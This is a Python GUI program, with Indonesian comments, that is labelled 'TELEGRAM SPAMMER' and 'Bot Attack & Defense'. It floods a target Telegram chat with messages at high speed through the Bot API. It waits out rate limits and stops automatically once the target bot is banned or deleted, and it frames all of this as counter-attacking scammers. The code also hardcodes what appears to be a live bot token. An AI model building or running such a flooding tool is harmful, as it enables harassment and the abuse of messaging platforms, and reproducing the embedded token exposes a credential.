import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
import asyncio
import aiohttp
import threading
import time
import webbrowser
import json
import os
from datetime import datetime

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Konfigurasi Tema Modern
ctk.set_appearance_mode("Dark")  # Modes: "System", "Dark", "Light"
ctk.set_default_color_theme("blue")  # Themes: "blue", "green", "dark-blue"

class SplashScreen(ctk.CTkToplevel):
    def __init__(self, master):
        super().__init__(master)
        self.title("Loading...")
        self.geometry("450x300")
        self.overrideredirect(True) # Hilangkan border window (borderless)
        
        # Selalu posisikan di atas jendela lain
        self.attributes("-topmost", True)
        
        # Posisikan window di tengah layar
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        x = int((screen_width/2) - (450/2))
        y = int((screen_height/2) - (300/2))
        self.geometry(f"450x300+{x}+{y}")
        
        # Coba load gambar logo-badai.png, jika gagal gunakan teks
        loaded_image = False
        if HAS_PIL and os.path.exists("logo-badai.png"):
            try:
                img_data = Image.open("logo-badai.png")
                self.logo_img = ctk.CTkImage(light_image=img_data, dark_image=img_data, size=(200, 200))
                lbl = ctk.CTkLabel(self, image=self.logo_img, text="")
                lbl.pack(expand=True, fill="both")
                loaded_image = True
            except Exception:
                pass

        if not loaded_image:
            fallback_frame = ctk.CTkFrame(self, fg_color="transparent")
            fallback_frame.pack(expand=True, fill="both")
            title = ctk.CTkLabel(fallback_frame, text="TELEGRAM SPAMMER", font=ctk.CTkFont(size=28, weight="bold"), text_color="#3498db")
            title.pack(expand=True, pady=(80, 0))
            subtitle = ctk.CTkLabel(fallback_frame, text="Loading interface...", font=ctk.CTkFont(size=14))
            subtitle.pack(expand=True, pady=(0, 80))

        # Pindah ke aplikasi utama setelah 3000ms (3 detik)
        self.after(3000, self.start_main_app)

    def start_main_app(self):
        # Hapus jendela splash screen
        self.destroy()
        
        # Tampilkan kembali jendela root utama yang sebelumnya disembunyikan
        self.master.deiconify() 
        
        # Inisialisasi UI Aplikasi Utama ke dalam jendela root
        app = TelegramSenderApp(self.master)


class TelegramSenderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Bot Attack & Defense Asynchronous Interface")
        self.root.geometry("700x850")
        self.root.minsize(650, 750) # Batas minimum resize
        self.root.resizable(True, True) # Mengaktifkan sifat responsif
        
        # State variables
        self.is_running = False
        self.success_count = 0
        self.fail_count = 0
        self.total_target = 0
        self.profile_file = "profile.json"
        
        self.setup_ui()
        
    def setup_ui(self):
        # --- Header Frame (Title, Disclaimer & About) ---
        header_frame = ctk.CTkFrame(self.root, fg_color="transparent")
        header_frame.pack(fill=tk.X, padx=20, pady=(20, 10))
        
        title_label = ctk.CTkLabel(header_frame, text="B.A.D.A.I 🌪️", font=ctk.CTkFont(size=24, weight="bold"))
        title_label.pack(side=tk.LEFT)
        
        about_btn = ctk.CTkButton(header_frame, text="ℹ️ About", width=80, fg_color="#34495e", hover_color="#2c3e50", command=self.show_about)
        about_btn.pack(side=tk.RIGHT)
        
        disclaimer_btn = ctk.CTkButton(header_frame, text="⚠️ Disclaimer", width=100, fg_color="#e67e22", hover_color="#d35400", command=self.show_disclaimer)
        disclaimer_btn.pack(side=tk.RIGHT, padx=(0, 10))

        # --- Config Frame ---
        config_frame = ctk.CTkFrame(self.root, corner_radius=10)
        config_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ctk.CTkLabel(config_frame, text="Konfigurasi API & Profil", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", padx=15, pady=(10, 0))
        
        # Bot Token
        token_frame = ctk.CTkFrame(config_frame, fg_color="transparent")
        token_frame.pack(fill=tk.X, padx=15, pady=5)
        ctk.CTkLabel(token_frame, text="Bot Token:", width=100, anchor="w").pack(side=tk.LEFT)
        self.token_entry = ctk.CTkEntry(token_frame, placeholder_text="Masukkan Token Bot Telegram...", width=450)
        self.token_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.token_entry.insert(0, "8191633285:AAGhwuPEWns2iULlrRQWiTZFxHfv2qPBoD8") 
        
        # Target Chat ID
        chat_frame = ctk.CTkFrame(config_frame, fg_color="transparent")
        chat_frame.pack(fill=tk.X, padx=15, pady=(5, 10))
        ctk.CTkLabel(chat_frame, text="Target Chat ID:", width=100, anchor="w").pack(side=tk.LEFT)
        self.chat_id_entry = ctk.CTkEntry(chat_frame, placeholder_text="Contoh: 418088322", width=250)
        self.chat_id_entry.pack(side=tk.LEFT)

        # Profile Buttons
        profile_frame = ctk.CTkFrame(config_frame, fg_color="transparent")
        profile_frame.pack(fill=tk.X, padx=15, pady=(0, 15))
        
        load_btn = ctk.CTkButton(profile_frame, text="📂 Muat Profil", width=120, fg_color="#8e44ad", hover_color="#9b59b6", command=self.load_profile)
        load_btn.pack(side=tk.RIGHT, padx=(10, 0))
        
        save_btn = ctk.CTkButton(profile_frame, text="💾 Simpan Profil", width=120, fg_color="#2980b9", hover_color="#3498db", command=self.save_profile)
        save_btn.pack(side=tk.RIGHT)

        # --- Message Frame ---
        msg_frame = ctk.CTkFrame(self.root, corner_radius=10)
        # expand=True membuatnya proporsional saat window di-resize (responsif)
        msg_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10) 
        
        ctk.CTkLabel(msg_frame, text="Pesan Payload (Mendukung HTML)", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", padx=15, pady=(10, 5))
        self.msg_text = ctk.CTkTextbox(msg_frame, height=100, corner_radius=8)
        self.msg_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        # --- Attack Config Frame ---
        atk_frame = ctk.CTkFrame(self.root, corner_radius=10)
        atk_frame.pack(fill=tk.X, padx=20, pady=10)
        
        atk_inner = ctk.CTkFrame(atk_frame, fg_color="transparent")
        atk_inner.pack(fill=tk.X, padx=15, pady=15)
        
        ctk.CTkLabel(atk_inner, text="Jumlah Pesan:").pack(side=tk.LEFT, pady=2)
        self.count_entry = ctk.CTkEntry(atk_inner, width=100)
        self.count_entry.insert(0, "100")
        self.count_entry.pack(side=tk.LEFT, padx=(10, 30))
        
        ctk.CTkLabel(atk_inner, text="Kecepatan (RPS):").pack(side=tk.LEFT)
        self.rps_entry = ctk.CTkEntry(atk_inner, width=100)
        self.rps_entry.insert(0, "50")
        self.rps_entry.pack(side=tk.LEFT, padx=(10, 0))

        # --- Actions Frame ---
        action_frame = ctk.CTkFrame(self.root, fg_color="transparent")
        action_frame.pack(fill=tk.X, padx=20, pady=5)
        
        self.start_btn = ctk.CTkButton(action_frame, text="🚀 MULAI KIRIM", fg_color="#2ecc71", hover_color="#27ae60", text_color="white", font=ctk.CTkFont(weight="bold"), command=self.start_sending)
        self.start_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10), ipady=8)
        
        self.stop_btn = ctk.CTkButton(action_frame, text="🛑 BERHENTI", fg_color="#e74c3c", hover_color="#c0392b", text_color="white", font=ctk.CTkFont(weight="bold"), state="disabled", command=self.stop_sending)
        self.stop_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(10, 0), ipady=8)
        
        # --- Progress Bar ---
        self.progress_bar = ctk.CTkProgressBar(self.root, height=10)
        self.progress_bar.pack(fill=tk.X, padx=20, pady=(15, 5))
        self.progress_bar.set(0)

        # --- Log / Status Frame ---
        log_frame = ctk.CTkFrame(self.root, corner_radius=10)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=(10, 20))
        
        self.status_var = ctk.StringVar()
        self.status_var.set("Status: Menunggu (Sukses: 0 | Gagal: 0)")
        ctk.CTkLabel(log_frame, textvariable=self.status_var, font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=15, pady=(10, 5))
        
        self.log_text = tk.Text(log_frame, height=8, state=tk.DISABLED, bg="#1a1a1a", fg="#00ff00", font=("Consolas", 10), relief="flat", padx=10, pady=10)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))

    def show_disclaimer(self):
        """Menampilkan popup peringatan legal/disclaimer"""
        messagebox.showwarning(
            "⚠️ Disclaimer",
            "This tool is created SOLELY for educational purposes, legal penetration testing, and Active Defense against cyber threats (such as scammers).\n\n"
            "Any misuse of this tool that harms other parties or violates Telegram's Terms of Service is the sole responsibility of the user. "
            "The author (xsanlahci) is released from any legal liability arising from the use of this tool."
        )

    def show_about(self):
        """Menampilkan popup About dengan link yang bisa diklik"""
        about_win = ctk.CTkToplevel(self.root)
        about_win.title("About")
        about_win.geometry("400x250")
        about_win.attributes("-topmost", True)  # Selalu di depan
        about_win.resizable(False, False)
        
        ctk.CTkLabel(about_win, text="B.A.D.A.I 🌪️", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=(30, 10))
        ctk.CTkLabel(about_win, text="Bot Attack & Defense Asynchronous Interface", font=ctk.CTkFont(size=14)).pack(pady=2)
        ctk.CTkLabel(about_win, text="Coded by xsanlahci © 2026", font=ctk.CTkFont(size=14)).pack(pady=2)
        ctk.CTkLabel(about_win, text="This tool is created EXCLUSIVELY to deter and counteract scammers.").pack(pady=(2, 15))
        
        link_label = ctk.CTkLabel(about_win, text="ittampan.wordpress.com", text_color="#3498db", font=ctk.CTkFont(underline=True), cursor="hand2")
        link_label.pack(pady=5)
        
        # Event binding untuk membuka link di browser default
        link_label.bind("<Button-1>", lambda e: webbrowser.open_new("https://ittampan.wordpress.com/?p=1295"))
        
        close_btn = ctk.CTkButton(about_win, text="Tutup", width=100, command=about_win.destroy)
        close_btn.pack(pady=20)

    def save_profile(self):
        """Menyimpan konfigurasi saat ini ke JSON"""
        data = {
            "token": self.token_entry.get().strip(),
            "chat_id": self.chat_id_entry.get().strip(),
            "message": self.msg_text.get("1.0", tk.END).strip(),
            "count": self.count_entry.get().strip(),
            "rps": self.rps_entry.get().strip()
        }
        try:
            with open(self.profile_file, "w") as f:
                json.dump(data, f, indent=4)
            messagebox.showinfo("Sukses", f"Profil berhasil disimpan ke '{self.profile_file}'")
            self.log("Konfigurasi disimpan ke profil.", "#3498db")
        except Exception as e:
            messagebox.showerror("Error", f"Gagal menyimpan profil:\n{e}")

    def load_profile(self):
        """Memuat konfigurasi dari JSON ke UI"""
        if not os.path.exists(self.profile_file):
            messagebox.showwarning("Peringatan", f"File profil '{self.profile_file}' belum ada. Silakan simpan profil terlebih dahulu.")
            return
            
        try:
            with open(self.profile_file, "r") as f:
                data = json.load(f)
            
            self.token_entry.delete(0, tk.END)
            self.token_entry.insert(0, data.get("token", ""))
            
            self.chat_id_entry.delete(0, tk.END)
            self.chat_id_entry.insert(0, data.get("chat_id", ""))
            
            self.msg_text.delete("1.0", tk.END)
            self.msg_text.insert("1.0", data.get("message", ""))
            
            self.count_entry.delete(0, tk.END)
            self.count_entry.insert(0, data.get("count", "100"))
            
            self.rps_entry.delete(0, tk.END)
            self.rps_entry.insert(0, data.get("rps", "50"))
            
            self.log("Profil berhasil dimuat.", "#2ecc71")
        except Exception as e:
            messagebox.showerror("Error", f"Gagal memuat profil:\n{e}")

    def log(self, message, color="#00ff00"):
        """Menulis log ke text area (Thread-safe)"""
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        log_msg = f"[{timestamp}] {message}\n"
        
        def update_gui():
            self.log_text.config(state=tk.NORMAL)
            self.log_text.insert(tk.END, log_msg, ("color",))
            self.log_text.tag_config("color", foreground=color)
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
            
            # Update Progress Bar & Status
            processed = self.success_count + self.fail_count
            if self.total_target > 0:
                progress = processed / self.total_target
                # Mencegah progress bar melampaui 1.0 (100%)
                self.progress_bar.set(min(progress, 1.0))
                
            self.status_var.set(f"Status: {'Berjalan' if self.is_running else 'Selesai'} (Sukses: {self.success_count} | Gagal: {self.fail_count} | Total: {self.total_target})")
            
        self.root.after(0, update_gui)

    def trigger_kill_switch(self):
        """Mematikan serangan jika terdeteksi bot sudah tumbang"""
        self.is_running = False
        self.log("==========================================", "#ff0000")
        self.log("🎯 KILL-SWITCH DIAKTIFKAN: TARGET DOWN!", "#ff0000")
        self.log("Bot kemungkinan telah dihapus atau di-banned.", "#ff0000")
        self.log("==========================================", "#ff0000")
        
        # Panggil UI Alert dari Main Thread
        self.root.after(0, self.show_target_down_alert)

    def show_target_down_alert(self):
        self.root.bell() # Memainkan bunyi peringatan sistem
        messagebox.showinfo(
            "🎯 TARGET DOWN!", 
            "Bot penipu telah berhasil ditumbangkan (dihapus/dibanned oleh Telegram)!\n\nSistem otomatis menghentikan serangan."
        )
        self.finish_sending()

    def start_sending(self):
        token = self.token_entry.get().strip()
        chat_id = self.chat_id_entry.get().strip()
        message = self.msg_text.get("1.0", tk.END).strip()
        
        try:
            total_count = int(self.count_entry.get())
            rps = int(self.rps_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Jumlah dan Kecepatan harus berupa angka!")
            return

        if not all([token, chat_id, message]):
            messagebox.showwarning("Peringatan", "Token, Chat ID, dan Pesan tidak boleh kosong!")
            return

        # Update UI State
        self.is_running = True
        self.success_count = 0
        self.fail_count = 0
        self.total_target = total_count
        self.progress_bar.set(0)
        
        self.start_btn.configure(state="disabled", fg_color="gray")
        self.stop_btn.configure(state="normal", fg_color="#e74c3c")
        
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete("1.0", tk.END)
        self.log_text.config(state=tk.DISABLED)
        
        self.log("Memulai proses asinkronus kecepatan tinggi...", "#3498db")
        
        # Jalankan asyncio loop di thread terpisah agar UI tidak freeze
        threading.Thread(target=self.run_asyncio_loop, args=(token, chat_id, message, total_count, rps), daemon=True).start()

    def stop_sending(self):
        self.is_running = False
        self.log("Menerima sinyal berhenti, menghentikan antrean...", "#f39c12")

    def finish_sending(self):
        self.is_running = False
        self.start_btn.configure(state="normal", fg_color="#2ecc71")
        self.stop_btn.configure(state="disabled", fg_color="gray")
        self.log("PROSES SELESAI.", "#3498db")
        # Jika bukan karena kill-switch, set progress ke 100%
        if self.success_count + self.fail_count >= self.total_target:
            self.progress_bar.set(1.0)

    # --- ASYNC BACKEND LOGIC ---
    
    def run_asyncio_loop(self, token, chat_id, message, total_count, rps):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.async_sender(token, chat_id, message, total_count, rps))
        self.root.after(0, self.finish_sending)

    async def send_single_message(self, session, url, payload, msg_id):
        if not self.is_running:
            return
            
        try:
            async with session.post(url, json=payload, timeout=10) as response:
                if response.status == 200:
                    self.success_count += 1
                    self.log(f"[Msg {msg_id}] Terkirim sukses.", "#2ecc71") # Green
                    
                # SMART KILL-SWITCH LOGIC (401 Unauthorized / 404 Not Found)
                elif response.status in [401, 404]:
                    self.fail_count += 1
                    if self.is_running: # Pastikan hanya tertrigger satu kali
                        self.trigger_kill_switch()
                        
                elif response.status == 429:
                    data = await response.json()
                    retry_after = data.get("parameters", {}).get("retry_after", 5)
                    self.fail_count += 1
                    self.log(f"[Msg {msg_id}] ERROR 429: Rate Limit! Jeda {retry_after}s", "#e74c3c") # Red
                    await asyncio.sleep(retry_after) 
                    
                else:
                    self.fail_count += 1
                    self.log(f"[Msg {msg_id}] Gagal: HTTP {response.status}", "#e74c3c") # Red
        except Exception as e:
            self.fail_count += 1
            self.log(f"[Msg {msg_id}] Exception: {str(e)[:40]}...", "#e74c3c") # Red

    async def async_sender(self, token, chat_id, message, total_count, rps):
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        sleep_interval = 1.0 / rps 
        
        connector = aiohttp.TCPConnector(limit=rps * 2)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = set()
            
            for i in range(1, total_count + 1):
                if not self.is_running:
                    break
                
                task = asyncio.create_task(self.send_single_message(session, url, payload, i))
                tasks.add(task)
                tasks.difference_update({t for t in tasks if t.done()})
                
                await asyncio.sleep(sleep_interval)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == "__main__":
    # Inisialisasi Root Utama TERSEMBUNYI
    root = ctk.CTk()
    root.withdraw() # Sembunyikan jendela utamanya
    
    # Jalankan Splash Screen di atas root
    splash = SplashScreen(root)
    
    # Masuk ke main loop aplikasi
    root.mainloop()
